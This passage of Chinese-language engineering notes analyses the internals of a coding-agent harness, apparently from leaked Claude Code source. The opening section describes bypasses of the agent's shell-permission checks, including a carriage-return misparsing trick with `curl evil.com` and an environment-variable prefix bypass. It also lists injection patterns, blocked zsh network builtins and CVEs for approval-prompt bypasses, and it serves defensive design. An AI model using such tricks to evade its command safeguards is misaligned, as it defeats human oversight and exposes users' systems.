| 4 | Permission rule engine | exact/prefix/wildcard 規則，deny > ask > allow |
| 5 | 路徑約束檢查 | 工作目錄邊界、危險路徑（.git/.ssh）|
| 6 | 只讀驗證 | command allowlist，精確到 flag 層級 |
| 7 | OS sandbox | bwrap/sandbox-runtime，檔案系統 + 網路隔離 |

**23 個 validators 分三類**：

**最關鍵——Misparsing 攻擊（7 個）**：偵測 `shell-quote` 函式庫解析與實際 bash 行為的差異。例：`\r` 在雙引號外——`shell-quote` 的 `\s` 包含 `\r` 但 bash IFS 不含，使 `TZ=UTC\recho curl evil.com` 繞過 `Bash(echo:*)` allow 規則。**Misparsing validators 有執行優先權**——其他 validators 的結果被 defer，防止 short-circuit 遮蔽更危險的攻擊。

**注入模式（8 個）**：command substitution (`$()`, backticks)、process substitution (`<()`, `>()`)、brace expansion、IFS injection、`/proc/*/environ` access、redirections、dangerous variables。

**混淆偵測（8 個）**：ANSI-C quotes (`$'...'`)、quoted flags、split-quote flags、Unicode whitespace、backslash-escaped operators (`\;`, `\|`, `\&`)、obfuscated flags。另外 18 個危險 zsh builtins 被封鎖（`zmodload`, `zpty`, `ztcp`, `mapfile`, `zf_rm` 等）。

**Permission Rule Engine**：14 步決策流程。Allow 規則只 strip 安全環境變數；**Deny 規則 strip 所有環境變數**（防止 `FOO=bar denied_command` bypass）。Prefix/wildcard 規則**永不匹配**複合指令（`Bash(cd:*)` 不能匹配 `cd /path && rm -rf`）。子指令展開上限 50 個。

**投機性分類器**：跟 pre-tool hooks 並行啟動 Haiku 分類——減少 permission 決策的總延遲。

### G4. Tool Concurrency Safety 實作細節

`partitionToolCalls()`（`toolOrchestration.ts`）實作貪心批次策略：
- 相鄰 `isConcurrencySafe(parsedInput) === true` 的工具合併為一個並行批次
- 回傳 `false` 的獨立成序列批次
- 最大並行數：10（`CLAUDE_CODE_MAX_TOOL_USE_CONCURRENCY`）

**關鍵設計**：並行工具的 **context modifiers 被排隊**，批次全部完成後才**序列化應用**，防止共享 `ToolUseContext` 的 race condition。

**Per-tool 宣告**：`FileReadTool` → always `true`（讀並行安全）。`FileEditTool` → always `false`（寫必須序列）。`BashTool` → **分析具體指令**決定。

**10 層工具執行管線（每個工具呼叫）**：
1. Zod schema validation
2. Custom `validateInput()`
3. 投機性分類器啟動（Bash only）
4. `backfillObservableInput()` — 展開路徑供 hooks 使用，但 `tool.call()` 拿原始輸入
5. PreToolUse hooks（7 種結果型別：message, hookPermissionResult, hookUpdatedInput, preventContinuation, stopReason, additionalContext, stop）
6. Permission resolution（hook 決策 > canUseTool > interactive dialog）
7. `tool.call()` 執行
8. PostToolUse hooks
9. 工具結果大小管理（>50K chars → 寫入檔案，返回 preview）
10. Per-message 預算：`MAX_TOOL_RESULTS_PER_MESSAGE_CHARS = 200,000`

**Stream bridge pattern**：`streamedCheckPermissionsAndCallTool` 用自製 `Stream` class 橋接 callback-style API 到 async iterable，讓 progress events 和最終結果共享一個 stream。

### G5. AutoDream 完整四階段流程

背景 forked agent，模擬「睡眠記憶整合」。理論依據：UC Berkeley/Letta paper "Sleep-time Compute" (arXiv:2504.13171)。

**三重閘門（由便宜到貴）**：
1. Static gate：非 KAIROS、非 remote、auto-memory 啟用、AutoDream 啟用
2. Time gate：距上次整合 ≥24h（可透過 `tengu_onyx_plover` GrowthBook flag 設定）
3. Session gate：距上次整合 ≥5 sessions（掃描節流 10 分鐘一次）

**四階段 prompt**：
- **Phase 1 Orient**：`ls` memory 目錄、讀 MEMORY.md、瀏覽 topic files
- **Phase 2 Gather**：檢查 daily logs (`logs/YYYY/MM/YYYY-MM-DD.md`)、找 drifted memories、targeted transcript grep（最後手段）
- **Phase 3 Consolidate**：合併信號到現有 topic files、相對日期轉絕對日期、刪除被矛盾的事實
- **Phase 4 Prune**：更新 MEMORY.md index（<200 行, <25KB）、壓縮長條目、移除陳舊指標

**工具約束**：forked agent 的 Bash 限制為只讀指令（`ls`, `find`, `grep`, `cat`, `stat`, `wc`, `head`, `tail`）。

**關鍵區別**：`/dream` 指令在主迴圈跑（有完整工具權限），AutoDream 在受限 forked agent 跑。兩者共用 `buildConsolidationPrompt()`。

**觀測到的效能**：913 sessions 在 9 分鐘內整合完畢。

### G6. 隱藏的 TeammateTool（Swarm 系統）

完整實作但 feature-gated off（`I9()` 和 `qFB()` 兩個閘門）。

**13 個操作**：`spawnTeam`, `discoverTeams`, `requestJoin`, `approveJoin`, `write`（定向訊息）, `broadcast`（團隊廣播）, `approvePlan`, `requestShutdown`…

**狀態存儲**：`~/.claude/teams/{team-name}/`

**環境變數定義 agent 身份**：`CLAUDE_CODE_TEAM_NAME`, `CLAUDE_CODE_AGENT_ID`, `CLAUDE_CODE_AGENT_TYPE`

**通訊型別**（mailbox 系統，7 種訊息）：permission request、lockfile synchronization 等。`InProcessTeammateTask` 用 `AsyncLocalStorage` 隔離 context，防止多個 teammates 間 context bleed。

### G7. KAIROS Mode 完整架構

6 個子 feature flags：
1. `KAIROS` — 主模式
2. `KAIROS_BRIEF` — 摘要模式
3. `KAIROS_CHANNELS` — 溝通頻道
4. `KAIROS_DREAM` — 自己的 dream 機制（跟 AutoDream 互斥）
5. `KAIROS_GITHUB_WEBHOOKS` — GitHub 整合
6. `KAIROS_PUSH_NOTIFICATION` — 終端背景化時的推播通知

**KAIROS system prompt 繞過正常 17-section 組裝**，使用專用 proactive prompt：
- Tick 機制：`<tick>` prompts 保持 agent alive
- Sleep tool：平衡 API 成本 vs 5 分鐘 cache TTL 到期
- 終端 focus 感知：校準自主程度

**行為契約**：第一次喚醒→打招呼問要做什麼。後續→偏向行動、做修改、在好的停止點 commit。壓縮時明確指示：「這不是第一次喚醒——繼續你的工作迴圈」。

### G8. ULTRAPLAN（未釋出）

**Remote sessions running Opus 4.6 with 30 分鐘 thinking time。** 本地終端每 3 秒輪詢。哨兵值 `__ULTRAPLAN_TELEPORT_LOCAL__` 返回結果。

### G9. Buddy System（未釋出）

Tamagotchi 風格的陪伴寵物系統：
- 確定性 Mulberry32 PRNG（per-user seed）
- 18 個物種，稀有度分級
- 1% shiny 機率
- 程序生成的 5-stat 檔案
- ASCII art

### G10. 5 個已知 CVE

| CVE | 問題 |
|-----|------|
| 2026-21852 | API keys 在信任確認前就被惡意 repo 設定洩漏 |
| 2025-59828 | Yarn config 在 directory-trust 對話前就被執行 |
| 2025-58764 | 惡意 context 繞過 approval prompts |
| 2025-64755 | Sed parser 缺陷允許在唯讀模式下任意寫檔 |
| 2025-52882 | 任意來源的 WebSocket 連線暴露編輯器狀態 |

**Penligent 安全分析**：源碼洩漏讓所有 boundary/transition 攻擊面更容易分析，對攻擊者產生**不對稱優勢**。

### G11. Cache Break Detection 完整機制

`promptCacheBreakDetection.ts`：雙階段系統（pre-call snapshot + post-call comparison），雙重過濾（>5% 相對下降 AND >2000 token 絕對下降）。

**12 種 cache break 原因**：model change、system prompt change、tool schema change、beta header change、fast mode toggle、overage state flip、effort change、TTL expiry（5min vs 1h）等。每種維護 per-source tracking，`MAX_TRACKED_SOURCES=10` 上限。

**4 個 Sticky Latch**：`afkModeHeaderLatched`, `fastModeHeaderLatched`, `cacheEditingHeaderLatched`, `thinkingClearLatched`——「一旦開啟就永不關閉」，防止 header toggling 造成 cache key 不穩定。

### G12. 訊息正規化管線（13 步）

`normalizeMessagesForAPI` 在每次 API 呼叫前執行：
1. attachment reordering
2. virtual message filtering
3. strip targets for API errors
4. synthetic error removal
5. user message merging
6. thinking block sanitization
7. tool input normalization
8. message ID tagging
9. tool reference relocation
10. system-reminder sibling merging
11. error tool result sanitization
12. *(step details from source code)*
13. *(final validation)*

### G13. Prompt Cache Engineering 完整策略

**2^N 問題**：如果 N 個 boolean flag 放在 static 區，會產生 2^N 種 cache prefix，摧毀命中率。PR #24490 和 #24171 修過這個 bug class。

**快取成本模型**：cache hit = 10% input tokens；cache miss = 125%。這解釋了為什麼 Anthropic 在 cache 工程上投入如此之重。

**`resolveSystemPromptSections()` 快取非 `cacheBreak` sections**（每 session 計算一次，直到 `/clear` 或 `/compact`）。

### G14. Harness Engineering 作為新興學科

洩漏催化了兩個概念進入主流開發者詞彙：

**Context Engineering**（Martin Fowler 分析）：「策展模型看到的東西以獲得更好結果。」跟 prompt engineering 的差異：系統性組織多個配置層——instructions、guidance、tools、resources——貫穿 agent 生命週期。

**Harness Engineering**（Phil Schmid / NxCode / HumanLayer）：設計 AI 模型周圍的作業系統層。類比：Model=CPU、Context Window=RAM、Harness=OS、Agent=Application。

**控制實驗數據**：harness engineering 把平均品質分數從 49.5 提升到 79.3（**+60%**）。

**Terminal Bench 2.0 反直覺發現**：**Opus 4.6 在 Claude Code 中排 #33，但在替代 harness 中排 #5。** 這表明 harness-model 耦合過度——為一個模型過度最佳化意味著 harness 可能無法遷移到其他模型。

**The Bitter Lesson applied**：Manus 6 個月重構 5 次，LangChain 每年 3 次重寫，Vercel 消除 80% tooling。輕量可適應的架構勝過僵化控制流。

### G15. 社群深度分析精選

**HN 技術討論**：
- **jakegmaths**：確認 Bun bundler bug 為根因（source maps 預設生成）
- **bkryza**：發現 `userPromptKeywords.ts` 中的 regex 情緒偵測過濾器
- **pprotas**：懷疑該 regex 本身是 LLM 生成的（「vibe-coded」）
- 多人辯護 regex 優於 LLM call 做情緒偵測——「免費 vs GPU 計算」

**Piebald-AI/claude-code-system-prompts**：追蹤 137 個版本以來所有 system prompt 組件的變化。

**paddo.dev**：發現隱藏的 multi-agent swarm 系統（TeammateTool 13 個操作）。

**dreadheadio**：從 feature flags 重建未釋出路線圖。

**HumanLayer**：提出 harness engineering 學科，用控制實驗量化 harness 對品質的影響。

### G16. 對 mini-agent 的新洞見

**之前已知的驗證（G 輪之前）**：
- MEMORY.md 設計、4 種記憶型別、Skills 系統、Agent 分離、Read-before-Modify

**G 輪新發現中值得採用的**：

1. **`isConcurrencySafe(input)` 是 input-dependent 而非 static flag** — 我們的 delegation routing 可以學這個：不是「這個工具安全嗎」而是「這個輸入下這個工具安全嗎」

2. **Compaction 的 `<analysis>` scratchpad** — 先推理再摘要，推理部分丟棄。我們的 context 壓縮可以加這個機制

3. **`DANGEROUS_` 前綴模式** — 自我文件化的 cache-breaking 理由。任何影響效能的改動都強制留下 `_reason`

4. **反工具呼叫防禦（NO_TOOLS_PREAMBLE/TRAILER）** — 壓縮 prompt 中模型嘗試呼叫工具是真實問題（Sonnet 4.6 有 2.79% 機率）

5. **Permission rule 的 deny 規則 strip 所有環境變數** — 防止 env var bypass，我們的安全模型可以參考

6. **Terminal Bench 反直覺數據** — harness-model 過度耦合的風險。我們用 CLI subprocess 避免了這個問題，但要注意不要反向陷入

7. **Stream bridge pattern** — callback-style 到 async iterable 的橋接，通用 pattern

**我們做得更好的（G 輪確認）**：
- CLI subprocess 路線跳過整個 cache engineering 複雜度
- 三層決策階梯比二元 allow/deny 更細膩
- Constraint Texture 是不同抽象層——他們做工程最佳實踐，我們做認知架構
- 有機並行（Physarum）vs 他們的 Coordinator mode——我們的更靈活

### G17. 額外社群項目索引

| 項目 | 用途 |
|------|------|
| [Kuberwastaken/claude-code](https://github.com/Kuberwastaken/claude-code) | 主要存檔 + 架構分析 |
| [instructkr/claw-code](https://github.com/instructkr/claw-code) | Python→Rust 重寫 harness |
| [instructkr/clawd-code](https://github.com/instructkr/clawd-code) | 平行重寫（WSJ 報導過）|
| [Piebald-AI/claude-code-system-prompts](https://github.com/Piebald-AI/claude-code-system-prompts) | 137 版 system prompt 追蹤 |
| [cablate/claude-code-research](https://github.com/cablate/claude-code-research) | 75 篇分析報告 |
| [sanbuphy/claude-code-source-code](https://github.com/sanbuphy/claude-code-source-code) | 唯一可重新編譯的 mirror |
| [paddo.dev](https://paddo.dev/blog/claude-code-hidden-swarm/) | 隱藏 swarm 系統分析 |
| [dreadheadio](https://dreadheadio.github.io/claude-code-roadmap/) | Feature flags 路線圖重建 |

### G18. 額外參考資料

- [Martin Fowler: Context Engineering for Coding Agents](https://martinfowler.com/articles/exploring-gen-ai/context-engineering-coding-agents.html)
- [Phil Schmid: Agent Harness 2026](https://www.philschmid.de/agent-harness-2026)
- [Anthropic: Effective Harnesses for Long-Running Agents](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents)
- [NxCode: Harness Engineering Guide](https://www.nxcode.io/resources/news/what-is-harness-engineering-complete-guide-2026)
- [HumanLayer: Skill Issue — Harness Engineering](https://www.humanlayer.dev/blog/skill-issue-harness-engineering-for-coding-agents)
- [Penligent Security Analysis](https://www.penligent.ai/hackinglabs/claude-code-source-map-leak-what-was-exposed-and-what-it-means/)
- [DEV Community: Full Architecture Breakdown](https://dev.to/gabrielanhaia/claude-codes-entire-source-code-was-just-leaked-via-npm-source-maps-heres-whats-inside-cjo)
- [HN Discussion Thread](https://news.ycombinator.com/item?id=47584540)
- UC Berkeley/Letta: "Sleep-time Compute" (arXiv:2504.13171)
